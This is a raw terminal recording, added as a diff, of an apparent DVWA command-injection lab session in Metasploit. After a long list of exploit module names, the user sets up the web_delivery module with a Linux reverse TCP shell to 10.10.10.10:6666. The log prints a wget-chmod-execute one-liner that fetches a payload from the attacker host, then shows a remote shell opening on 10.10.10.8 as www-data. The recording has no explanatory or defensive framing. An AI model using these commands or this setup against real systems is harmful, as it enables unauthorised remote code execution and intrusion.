@@ -1,0 +1,2052 @@
+Script started on 2020-08-27 14:06:58+05:30 [TERM="xterm-256color" TTY="/dev/pts/1" COLUMNS="135" LINES="34"]
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/dvwa/Command_Injection[01;31mdinesh@evil[00m: [[01;34mCommand_Injection[00m] $ mscon-[K[K[K[Kfd[Kconsole -q
+-----------------------------------------------------------------------------------
+The pg and/or activerecord gem version has changed, meaning deprecated pg constants
+may no longer be in use, so try deleting this file to see if the
+'The PGconn, PGresult, and PGError constants are deprecated...' message has gone:
+/usr/share/metasploit-framework/lib/pg/deprecated_constants.rb
+-----------------------------------------------------------------------------------
+
+[1m[34m[*][0m Starting persistent handler(s)...
+
+[?1034h[4mmsf5[0m [0m> 
+[0m[4mmsf5[0m [0m> 
+[0m[4mmsf5[0m [0m> [H[2J[4mmsf5[0m [0m> s[Kuse xpl[K[Ke[K[Kexploit/multi/
+Display all 333 possibilities? (y or n)
+use exploit/multi/browser/adobe_flash_hacking_team_uaf
+use exploit/multi/browser/adobe_flash_nellymoser_bof
+use exploit/multi/browser/adobe_flash_net_connection_confusion
+use exploit/multi/browser/adobe_flash_opaque_background_uaf
+use exploit/multi/browser/adobe_flash_pixel_bender_bof
+use exploit/multi/browser/adobe_flash_shader_drawing_fill
+use exploit/multi/browser/adobe_flash_shader_job_overflow
+use exploit/multi/browser/adobe_flash_uncompress_zlib_uaf
+use exploit/multi/browser/chrome_array_map
+use exploit/multi/browser/chrome_jscreate_sideeffect
+use exploit/multi/browser/chrome_object_create
+use exploit/multi/browser/firefox_escape_retval
+use exploit/multi/browser/firefox_pdfjs_privilege_escalation
+use exploit/multi/browser/firefox_proto_crmfrequest
+use exploit/multi/browser/firefox_proxy_prototype
+use exploit/multi/browser/firefox_queryinterface
+use exploit/multi/browser/firefox_svg_plugin
+use exploit/multi/browser/firefox_tostring_console_injection
+use exploit/multi/browser/firefox_webidl_injection
+use exploit/multi/browser/firefox_xpi_bootstrapped_addon
+use exploit/multi/browser/itms_overflow
+use exploit/multi/browser/java_atomicreferencearray
+use exploit/multi/browser/java_calendar_deserialize
+use exploit/multi/browser/java_getsoundbank_bof
+use exploit/multi/browser/java_jre17_driver_manager
+use exploit/multi/browser/java_jre17_exec
+use exploit/multi/browser/java_jre17_glassfish_averagerangestatisticimpl
+use exploit/multi/browser/java_jre17_jaxws
+use exploit/multi/browser/java_jre17_jmxbean
+use exploit/multi/browser/java_jre17_jmxbean_2
+use exploit/multi/browser/java_jre17_method_handle
+use exploit/multi/browser/java_jre17_provider_skeleton
+use exploit/multi/browser/java_jre17_reflection_types
+--More--[Kuse exploit/multi/browser/java_rhino
+use exploit/multi/browser/java_rmi_connection_impl
+use exploit/multi/browser/java_setdifficm_bof
+use exploit/multi/browser/java_signed_applet
+use exploit/multi/browser/java_storeimagearray
+use exploit/multi/browser/java_trusted_chain
+use exploit/multi/browser/java_verifier_field_access
+use exploit/multi/browser/mozilla_compareto
+use exploit/multi/browser/mozilla_navigatorjava
+use exploit/multi/browser/msfd_rce_browser
+use exploit/multi/browser/opera_configoverwrite
+use exploit/multi/browser/opera_historysearch
+use exploit/multi/browser/qtjava_pointer
+use exploit/multi/elasticsearch/script_mvel_rce
+use exploit/multi/elasticsearch/search_groovy_script
+use exploit/multi/fileformat/adobe_u3d_meshcont
+use exploit/multi/fileformat/evince_cbt_cmd_injection
+use exploit/multi/fileformat/ghostscript_failed_restore
+use exploit/multi/fileformat/js_unpacker_eval_injection
+use exploit/multi/fileformat/libreoffice_logo_exec
+use exploit/multi/fileformat/libreoffice_macro_exec
+use exploit/multi/fileformat/maple_maplet
+use exploit/multi/fileformat/nodejs_js_yaml_load_code_exec
+use exploit/multi/fileformat/office_word_macro
+use exploit/multi/fileformat/peazip_command_injection
+use exploit/multi/fileformat/swagger_param_inject
+use exploit/multi/fileformat/zip_slip
+use exploit/multi/ftp/pureftpd_bash_env_exec
+use exploit/multi/ftp/wuftpd_site_exec_format
+use exploit/multi/gdb/gdb_server_exec
+use exploit/multi/hams/steamed
+use exploit/multi/handler
+use exploit/multi/http/activecollab_chat
+--More--[Kuse exploit/multi/http/ajaxplorer_checkinstall_exec
+use exploit/multi/http/apache_activemq_upload_jsp
+use exploit/multi/http/apache_jetspeed_file_upload
+use exploit/multi/http/apache_mod_cgi_bash_env_exec
+use exploit/multi/http/apache_roller_ognl_injection
+use exploit/multi/http/apprain_upload_exec
+use exploit/multi/http/atutor_sqli
+use exploit/multi/http/auxilium_upload_exec
+use exploit/multi/http/axis2_deployer
+use exploit/multi/http/bassmaster_js_injection
+use exploit/multi/http/bolt_file_upload
+use exploit/multi/http/builderengine_upload_exec
+use exploit/multi/http/caidao_php_backdoor_exec
+use exploit/multi/http/cisco_dcnm_upload
+use exploit/multi/http/cisco_dcnm_upload_2019
+use exploit/multi/http/clipbucket_fileupload_exec
+use exploit/multi/http/cmsms_object_injection_rce
+use exploit/multi/http/cmsms_showtime2_rce
+use exploit/multi/http/cmsms_upload_rename_rce
+use exploit/multi/http/coldfusion_ckeditor_file_upload
+use exploit/multi/http/coldfusion_rds_auth_bypass
+use exploit/multi/http/confluence_widget_connector
+use exploit/multi/http/cups_bash_env_exec
+use exploit/multi/http/cuteflow_upload_exec
+use exploit/multi/http/dexter_casinoloader_exec
+use exploit/multi/http/drupal_drupageddon
+use exploit/multi/http/eaton_nsm_code_exec
+use exploit/multi/http/eventlog_file_upload
+use exploit/multi/http/extplorer_upload_exec
+use exploit/multi/http/familycms_less_exec
+use exploit/multi/http/freenas_exec_raw
+use exploit/multi/http/gestioip_exec
+use exploit/multi/http/getsimplecms_unauth_code_exec
+--More--[Kuse exploit/multi/http/git_client_command_exec
+use exploit/multi/http/git_submodule_command_exec
+use exploit/multi/http/git_submodule_url_exec
+use exploit/multi/http/gitlab_shell_exec
+use exploit/multi/http/gitlist_arg_injection
+use exploit/multi/http/gitorious_graph
+use exploit/multi/http/glassfish_deployer
+use exploit/multi/http/glossword_upload_exec
+use exploit/multi/http/glpi_install_rce
+use exploit/multi/http/horde_csv_rce
+use exploit/multi/http/horde_form_file_upload
+use exploit/multi/http/horde_href_backdoor
+use exploit/multi/http/hp_sitescope_issuesiebelcmd
+use exploit/multi/http/hp_sitescope_uploadfileshandler
+use exploit/multi/http/hp_sys_mgmt_exec
+use exploit/multi/http/hyperic_hq_script_console
+use exploit/multi/http/ibm_openadmin_tool_soap_welcomeserver_exec
+use exploit/multi/http/ispconfig_php_exec
+use exploit/multi/http/jboss_bshdeployer
+use exploit/multi/http/jboss_deploymentfilerepository
+use exploit/multi/http/jboss_invoke_deploy
+use exploit/multi/http/jboss_maindeployer
+use exploit/multi/http/jboss_seam_upload_exec
+use exploit/multi/http/jenkins_metaprogramming
+use exploit/multi/http/jenkins_script_console
+use exploit/multi/http/jenkins_xstream_deserialize
+use exploit/multi/http/jira_hipchat_template
+use exploit/multi/http/jira_plugin_upload
+use exploit/multi/http/joomla_http_header_rce
+use exploit/multi/http/kordil_edms_upload_exec
+use exploit/multi/http/lcms_php_exec
+use exploit/multi/http/liferay_java_unmarshalling
+use exploit/multi/http/log1cms_ajax_create_folder
+--More--[Kuse exploit/multi/http/magento_unserialize
+use exploit/multi/http/makoserver_cmd_exec
+use exploit/multi/http/manage_engine_dc_pmp_sqli
+use exploit/multi/http/manageengine_auth_upload
+use exploit/multi/http/manageengine_sd_uploader
+use exploit/multi/http/manageengine_search_sqli
+use exploit/multi/http/mantisbt_manage_proj_page_rce
+use exploit/multi/http/mantisbt_php_exec
+use exploit/multi/http/mediawiki_syntaxhighlight
+use exploit/multi/http/mediawiki_thumb
+use exploit/multi/http/metasploit_static_secret_key_base
+use exploit/multi/http/metasploit_webui_console_command_execution
+use exploit/multi/http/mma_backdoor_upload
+use exploit/multi/http/mobilecartly_upload_exec
+use exploit/multi/http/monstra_fileupload_exec
+use exploit/multi/http/moodle_cmd_exec
+use exploit/multi/http/movabletype_upgrade_exec
+use exploit/multi/http/mutiny_subnetmask_exec
+use exploit/multi/http/nas4free_php_exec
+use exploit/multi/http/navigate_cms_rce
+use exploit/multi/http/netwin_surgeftp_exec
+use exploit/multi/http/nibbleblog_file_upload
+use exploit/multi/http/nostromo_code_exec
+use exploit/multi/http/novell_servicedesk_rce
+use exploit/multi/http/nuuo_nvrmini_upgrade_rce
+use exploit/multi/http/october_upload_bypass_exec
+use exploit/multi/http/op5_license
+use exploit/multi/http/op5_welcome
+use exploit/multi/http/openfire_auth_bypass
+use exploit/multi/http/openmediavault_cmd_exec
+use exploit/multi/http/openmrs_deserialization
+use exploit/multi/http/openx_backdoor_php
+use exploit/multi/http/opmanager_socialit_file_upload
+--More--[Kuse exploit/multi/http/oracle_ats_file_upload
+use exploit/multi/http/oracle_reports_rce
+use exploit/multi/http/oracle_weblogic_wsat_deserialization_rce
+use exploit/multi/http/orientdb_exec
+use exploit/multi/http/oscommerce_installer_unauth_code_exec
+use exploit/multi/http/pandora_upload_exec
+use exploit/multi/http/phoenix_exec
+use exploit/multi/http/php_cgi_arg_injection
+use exploit/multi/http/php_fpm_rce
+use exploit/multi/http/php_utility_belt_rce
+use exploit/multi/http/php_volunteer_upload_exec
+use exploit/multi/http/phpfilemanager_rce
+use exploit/multi/http/phpldapadmin_query_engine
+use exploit/multi/http/phpmailer_arg_injection
+use exploit/multi/http/phpmoadmin_exec
+use exploit/multi/http/phpmyadmin_3522_backdoor
+use exploit/multi/http/phpmyadmin_lfi_rce
+use exploit/multi/http/phpmyadmin_null_termination_exec
+use exploit/multi/http/phpmyadmin_preg_replace
+use exploit/multi/http/phpscheduleit_start_date
+use exploit/multi/http/phpstudy_backdoor_rce
+use exploit/multi/http/phptax_exec
+use exploit/multi/http/phpwiki_ploticus_exec
+use exploit/multi/http/pimcore_unserialize_rce
+use exploit/multi/http/playsms_filename_exec
+use exploit/multi/http/playsms_template_injection
+use exploit/multi/http/playsms_uploadcsv_exec
+use exploit/multi/http/plone_popen2
+use exploit/multi/http/pmwiki_pagelist
+use exploit/multi/http/polarcms_upload_exec
+use exploit/multi/http/processmaker_exec
+use exploit/multi/http/processmaker_plugin_upload
+use exploit/multi/http/qdpm_upload_exec
+--More--[Kuse exploit/multi/http/rails_actionpack_inline_exec
+use exploit/multi/http/rails_double_tap
+use exploit/multi/http/rails_dynamic_render_code_exec
+use exploit/multi/http/rails_json_yaml_code_exec
+use exploit/multi/http/rails_secret_deserialization
+use exploit/multi/http/rails_web_console_v2_code_exec
+use exploit/multi/http/rails_xml_yaml_code_exec
+use exploit/multi/http/rocket_servergraph_file_requestor_rce
+use exploit/multi/http/sflog_upload_exec
+use exploit/multi/http/shiro_rememberme_v124_deserialize
+use exploit/multi/http/shopware_createinstancefromnamedarguments_rce
+use exploit/multi/http/simple_backdoors_exec
+use exploit/multi/http/sit_file_upload
+use exploit/multi/http/snortreport_exec
+use exploit/multi/http/solarwinds_store_manager_auth_filter
+use exploit/multi/http/solr_velocity_rce
+use exploit/multi/http/sonicwall_gms_upload
+use exploit/multi/http/sonicwall_scrutinizer_methoddetail_sqli
+use exploit/multi/http/splunk_mappy_exec
+use exploit/multi/http/splunk_upload_app_exec
+use exploit/multi/http/spree_search_exec
+use exploit/multi/http/spree_searchlogic_exec
+use exploit/multi/http/struts2_code_exec_showcase
+use exploit/multi/http/struts2_content_type_ognl
+use exploit/multi/http/struts2_namespace_ognl
+use exploit/multi/http/struts2_rest_xstream
+use exploit/multi/http/struts_code_exec
+use exploit/multi/http/struts_code_exec_classloader
+use exploit/multi/http/struts_code_exec_exception_delegator
+use exploit/multi/http/struts_code_exec_parameters
+use exploit/multi/http/struts_default_action_mapper
+use exploit/multi/http/struts_dev_mode
+use exploit/multi/http/struts_dmi_exec
+--More--[Kuse exploit/multi/http/struts_dmi_rest_exec
+use exploit/multi/http/struts_include_params
+use exploit/multi/http/stunshell_eval
+use exploit/multi/http/stunshell_exec
+use exploit/multi/http/sun_jsws_dav_options
+use exploit/multi/http/sysaid_auth_file_upload
+use exploit/multi/http/sysaid_rdslogs_file_upload
+use exploit/multi/http/testlink_upload_exec
+use exploit/multi/http/tomcat_jsp_upload_bypass
+use exploit/multi/http/tomcat_mgr_deploy
+use exploit/multi/http/tomcat_mgr_upload
+use exploit/multi/http/totaljs_cms_widget_exec
+use exploit/multi/http/traq_plugin_exec
+use exploit/multi/http/trendmicro_threat_discovery_admin_sys_time_cmdi
+use exploit/multi/http/uptime_file_upload_1
+use exploit/multi/http/uptime_file_upload_2
+use exploit/multi/http/v0pcr3w_exec
+use exploit/multi/http/vbseo_proc_deutf
+use exploit/multi/http/vbulletin_unserialize
+use exploit/multi/http/vbulletin_widgetconfig_rce
+use exploit/multi/http/visual_mining_netcharts_upload
+use exploit/multi/http/vtiger_install_rce
+use exploit/multi/http/vtiger_logo_upload_exec
+use exploit/multi/http/vtiger_php_exec
+use exploit/multi/http/vtiger_soap_upload
+use exploit/multi/http/webnms_file_upload
+use exploit/multi/http/webpagetest_upload_exec
+use exploit/multi/http/werkzeug_debug_rce
+use exploit/multi/http/wikka_spam_exec
+use exploit/multi/http/wp_crop_rce
+use exploit/multi/http/wp_db_backup_rce
+use exploit/multi/http/wp_ninja_forms_unauthenticated_file_upload
+use exploit/multi/http/wp_responsive_thumbnail_slider_upload
+--More--[Kuse exploit/multi/http/x7chat2_php_exec
+use exploit/multi/http/zabbix_script_exec
+use exploit/multi/http/zemra_panel_rce
+use exploit/multi/http/zenworks_configuration_management_upload
+use exploit/multi/http/zenworks_control_center_upload
+use exploit/multi/http/zpanel_information_disclosure_rce
+use exploit/multi/ids/snort_dce_rpc
+use exploit/multi/local/allwinner_backdoor
+use exploit/multi/local/magnicomp_sysinfo_mcsiwrapper_priv_esc
+use exploit/multi/local/xorg_x11_suid_server
+use exploit/multi/local/xorg_x11_suid_server_modulepath
+use exploit/multi/misc/arkeia_agent_exec
+use exploit/multi/misc/batik_svg_java
+use exploit/multi/misc/bmc_patrol_cmd_exec
+use exploit/multi/misc/bmc_server_automation_rscd_nsh_rce
+use exploit/multi/misc/claymore_dual_miner_remote_manager_rce
+use exploit/multi/misc/consul_rexec_exec
+use exploit/multi/misc/consul_service_exec
+use exploit/multi/misc/erlang_cookie_rce
+use exploit/multi/misc/freeswitch_event_socket_cmd_exec
+use exploit/multi/misc/hp_data_protector_exec_integutil
+use exploit/multi/misc/hp_vsa_exec
+use exploit/multi/misc/ibm_tm1_unauth_rce
+use exploit/multi/misc/indesign_server_soap
+use exploit/multi/misc/java_jdwp_debugger
+use exploit/multi/misc/java_jmx_server
+use exploit/multi/misc/java_rmi_server
+use exploit/multi/misc/legend_bot_exec
+use exploit/multi/misc/msf_rpc_console
+use exploit/multi/misc/msfd_rce_remote
+use exploit/multi/misc/nodejs_v8_debugger
+use exploit/multi/misc/openoffice_document_macro
+use exploit/multi/misc/openview_omniback_exec
+--More--[Kuse exploit/multi/misc/osgi_console_exec
+use exploit/multi/misc/pbot_exec
+use exploit/multi/misc/persistent_hpca_radexec_exec
+use exploit/multi/misc/ra1nx_pubcall_exec
+use exploit/multi/misc/teamcity_agent_xmlrpc_exec
+use exploit/multi/misc/veritas_netbackup_cmdexec
+use exploit/multi/misc/w3tw0rk_exec
+use exploit/multi/misc/weblogic_deserialize
+use exploit/multi/misc/weblogic_deserialize_asyncresponseservice
+use exploit/multi/misc/weblogic_deserialize_badattrval
+use exploit/multi/misc/weblogic_deserialize_marshalledobject
+use exploit/multi/misc/weblogic_deserialize_rawobject
+use exploit/multi/misc/weblogic_deserialize_unicastref
+use exploit/multi/misc/wireshark_lwres_getaddrbyname
+use exploit/multi/misc/wireshark_lwres_getaddrbyname_loop
+use exploit/multi/misc/xdh_x_exec
+use exploit/multi/misc/zend_java_bridge
+use exploit/multi/mysql/mysql_udf_payload
+use exploit/multi/ntp/ntp_overflow
+use exploit/multi/php/php_unserialize_zval_cookie
+use exploit/multi/php/wp_duplicator_code_inject
+use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
+use exploit/multi/postgres/postgres_createlang
+use exploit/multi/realserver/describe
+use exploit/multi/samba/nttrans
+use exploit/multi/samba/usermap_script
+use exploit/multi/sap/sap_mgmt_con_osexec_payload
+use exploit/multi/sap/sap_soap_rfc_sxpg_call_system_exec
+use exploit/multi/sap/sap_soap_rfc_sxpg_command_exec
+use exploit/multi/script/web_delivery
+use exploit/multi/ssh/sshexec
+use exploit/multi/svn/svnserve_date
+use exploit/multi/upnp/libupnp_ssdp_overflow
+--More--[Kuse exploit/multi/vnc/vnc_keyboard_exec
+use exploit/multi/vpn/tincd_bof
+use exploit/multi/wyse/hagent_untrusted_hsdata
+[4mmsf5[0m [0m> use exploit/multi/[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Ksearch delivert[K[H[2J[4mmsf5[0m [0m> search deliver
+[0m
+Matching Modules
+================
+
+   #   Name                                                        Disclosure Date  Rank       Check  Description
+   -   ----                                                        ---------------  ----       -----  -----------
+   0   auxiliary/client/smtp/emailer                                                normal     No     Generic Emailer (SMTP)
+   1   auxiliary/scanner/gprs/gtp_echo                                              normal     No     GTP Echo Scanner
+   2   auxiliary/server/regsvr32_command_[45mdeliver[0my_server                            normal     No     Regsvr32.exe (.sct) Command [45mDeliver[0my Server
+   3   exploit/linux/http/citrix_dir_traversal_rce                 2019-12-17       [32mexcellent[0m  Yes    Citrix ADC (NetScaler) Directory Traversal RCE
+   4   exploit/linux/local/exim4_[45mdeliver[0m_message_priv_esc          2019-06-05       [32mexcellent[0m  Yes    Exim 4.87 - 4.91 Local Privilege Escalation
+   5   exploit/multi/http/rails_double_tap                         2019-03-13       [32mexcellent[0m  Yes    Ruby On Rails DoubleTap Development Mode secret_key_base Vulnerability
+   6   exploit/multi/postgres/postgres_copy_from_program_cmd_exec  2019-03-20       [32mexcellent[0m  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
+   7   exploit/multi/script/web_[45mdeliver[0my                           2013-07-19       manual     No     Script Web [45mDeliver[0my
+   8   exploit/windows/browser/winamp_playlist_unc                 2006-01-29       [32mgreat[0m      No     Winamp Playlist UNC Path Computer Name Overflow
+   9   exploit/windows/fileformat/irfanview_jpeg2000_bof           2012-01-16       normal     No     Irfanview JPEG2000 jp2 Stack Buffer Overflow
+   10  exploit/windows/fileformat/office_dde_[45mdeliver[0my              2017-10-09       manual     No     Microsoft Office DDE Payload [45mDeliver[0my
+   11  exploit/windows/fileformat/office_excel_slk                 2018-10-07       manual     No     Microsoft Excel .SLK Payload [45mDeliver[0my
+   12  exploit/windows/http/mdaemon_worldclient_form2raw           2003-12-29       [32mgreat[0m      Yes    MDaemon WorldClient form2raw.cgi Stack Buffer Overflow
+   13  exploit/windows/misc/ais_esel_server_rce                    2019-03-27       [32mexcellent[0m  Yes    AIS logistics ESEL-Server Unauth SQL Injection RCE
+   14  exploit/windows/misc/webdav_[45mdeliver[0my                        1999-01-01       manual     No     Serve DLL via webdav server
+   15  exploit/windows/mssql/mssql_linkcrawler                     2000-01-01       [32mgreat[0m      No     Microsoft SQL Server Database Link Crawling Command Execution
+   16  exploit/windows/mssql/mssql_payload                         2000-05-30       [32mexcellent[0m  Yes    Microsoft SQL Server Payload Execution
+   17  exploit/windows/mssql/mssql_payload_sqli                    2000-05-30       [32mexcellent[0m  No     Microsoft SQL Server Payload Execution via SQL Injection
+   18  exploit/windows/smb/smb_[45mdeliver[0my                            2016-07-26       [32mexcellent[0m  No     SMB [45mDeliver[0my
+   19  exploit/windows/winrm/winrm_script_exec                     2012-11-01       manual     No     WinRM Script Exec Remote Code Execution
+   20  post/windows/manage/pxeexploit                                               normal     No     Windows Manage PXE Exploit Server
+
+
+[4mmsf5[0m [0m> [H[2J[4mmsf5[0m [0m> use exploit/multi/script/web_delivery
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> show options 
+[0m
+Module options (exploit/multi/script/web_delivery):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT  8080             yes       The local port to listen on.
+   SSL      false            no        Negotiate SSL for incoming connections
+   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                   no        The URI to use for this exploit (default is random)
+
+
+Payload options (python/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Python
+
+
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> set t
+set target              set tcp::max_send_size  set tcp::send_delay     set timestampoutput     
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> set t
+set target              set tcp::max_send_size  set tcp::send_delay     set timestampoutput     
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> set target 
+set target 0              set target 4              set target Linux          set target PSH\ (Binary)  
+set target 1              set target 5              set target Mac\ OS\ X     set target Python         
+set target 2              set target 6              set target PHP            set target Regsvr32       
+set target 3              set target 7              set target PSH            set target pubprn         
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> set target [H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> set target 
+set target 0              set target 4              set target Linux          set target PSH\ (Binary)  
+set target 1              set target 5              set target Mac\ OS\ X     set target Python         
+set target 2              set target 6              set target PHP            set target Regsvr32       
+set target 3              set target 7              set target PSH            set target pubprn         
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> set target [K[K[K[K[K[K[K[K[K[K[Kshow targets 
+[0m
+Exploit targets:
+
+   Id  Name
+   --  ----
+   0   Python
+   1   PHP
+   2   PSH
+   3   Regsvr32
+   4   pubprn
+   5   PSH (Binary)
+   6   Linux
+   7   Mac OS X
+
+
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> set target 6
+[0mtarget => 6
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> show options 
+[0m
+Module options (exploit/multi/script/web_delivery):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT  8080             yes       The local port to listen on.
+   SSL      false            no        Negotiate SSL for incoming connections
+   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                   no        The URI to use for this exploit (default is random)
+
+
+Payload options (python/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   6   Linux
+
+
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> set payload linux/x64/meterpreter
+set payload linux/x64/meterpreter/bind_tcp       set payload linux/x64/meterpreter_reverse_https
+set payload linux/x64/meterpreter/reverse_tcp    set payload linux/x64/meterpreter_reverse_tcp
+set payload linux/x64/meterpreter_reverse_http   
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> set payload linux/x64/meterpreter[K[K[K[K[K[K[K[K[K[K[K[H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> set payload linux/x64/
+set payload linux/x64/exec                        set payload linux/x64/shell/bind_tcp
+set payload linux/x64/meterpreter/bind_tcp        set payload linux/x64/shell/reverse_tcp
+set payload linux/x64/meterpreter/reverse_tcp     set payload linux/x64/shell_bind_ipv6_tcp
+set payload linux/x64/meterpreter_reverse_http    set payload linux/x64/shell_bind_tcp
+set payload linux/x64/meterpreter_reverse_https   set payload linux/x64/shell_bind_tcp_random_port
+set payload linux/x64/meterpreter_reverse_tcp     set payload linux/x64/shell_reverse_ipv6_tcp
+set payload linux/x64/pingback_bind_tcp           set payload linux/x64/shell_reverse_tcp
+set payload linux/x64/pingback_reverse_tcp        
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> set payload linux/x64/shell
+set payload linux/x64/shell/bind_tcp              set payload linux/x64/shell_bind_tcp_random_port
+set payload linux/x64/shell/reverse_tcp           set payload linux/x64/shell_reverse_ipv6_tcp
+set payload linux/x64/shell_bind_ipv6_tcp         set payload linux/x64/shell_reverse_tcp
+set payload linux/x64/shell_bind_tcp              
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> set payload linux/x64/shell/reverse_tcp 
+[0mpayload => linux/x64/shell/reverse_tcp
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> l[H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> l[Kshow options 
+[0m
+Module options (exploit/multi/script/web_delivery):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT  8080             yes       The local port to listen on.
+   SSL      false            no        Negotiate SSL for incoming connections
+   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                   no        The URI to use for this exploit (default is random)
+
+
+Payload options (linux/x64/shell/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   6   Linux
+
+
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> set LPORT[K[K[K[KHOST 6666[K[K[K[K10.10.10.0[K10
+[0mLHOST => 10.10.10.10
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> set LPORT 6666
+[0mLPORT => 6666
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> show options 
+[0m
+Module options (exploit/multi/script/web_delivery):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT  8080             yes       The local port to listen on.
+   SSL      false            no        Negotiate SSL for incoming connections
+   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                   no        The URI to use for this exploit (default is random)
+
+
+Payload options (linux/x64/shell/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.10.10      yes       The listen address (an interface may be specified)
+   LPORT  6666             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   6   Linux
+
+
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> exploit 
+[0m[1m[34m[*][0m Exploit running as background job 0.
+[1m[34m[*][0m Exploit completed, but no session was created.
+
+[1m[34m[*][0m Started reverse TCP handler on 10.10.10.10:6666 
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [1m[34m[*][0m Using URL: http://0.0.0.0:8080/egkSHa
+[1m[34m[*][0m Local IP: http://10.10.10.10:8080/egkSHa
+[1m[34m[*][0m Server started.
+[1m[34m[*][0m Run the following command on the target machine:
+wget -qO L6fsJ9xI --no-check-certificate http://10.10.10.10:8080/egkSHa; chmod +x L6fsJ9xI; ./L6fsJ9xI& disown
+
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> 
+[1m[34m[*][0m 10.10.10.8       web_delivery - Delivering Payload (250 bytes)
+[1m[34m[*][0m Sending stage (38 bytes) to 10.10.10.8
+[1m[34m[*][0m Command shell session 1 opened (10.10.10.10:6666 -> 10.10.10.8:50786) at 2020-08-27 14:26:34 +0530
+
+[0m[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> sessions 
+[0m
+Active sessions
+===============
+
+  Id  Name  Type             Information  Connection
+  --  ----  ----             -----------  ----------
+  1         shell x64/linux               10.10.10.10:6666 -> 10.10.10.8:50786 (10.10.10.8)
+
+[4mmsf5[0m exploit([1m[31mmulti/script/web_delivery[0m) [0m> sessions 1-1i1 1
+[0m[1m[34m[*][0m Starting interaction with 1...
+
+
+q
+/bin/sh: 2: q: not found
+q w
+ 04:56:55 up  2:33,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+shell
+
+[1m[34m[*][0m Trying to find binary(python) on target machine
+[1m[34m[*][0m Found python at /usr/bin/python
+[1m[34m[*][0m Using `python` to pop up an interactive shell
+
+
+$ wh  whoami
+whoami
+www-data
+$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ ^L  ^C
+Abort session 1? [y/N]  y
+""
+
+[1m[34m[*][0m 10.10.10.8 - Command shell session 1 closed.  Reason: User exit
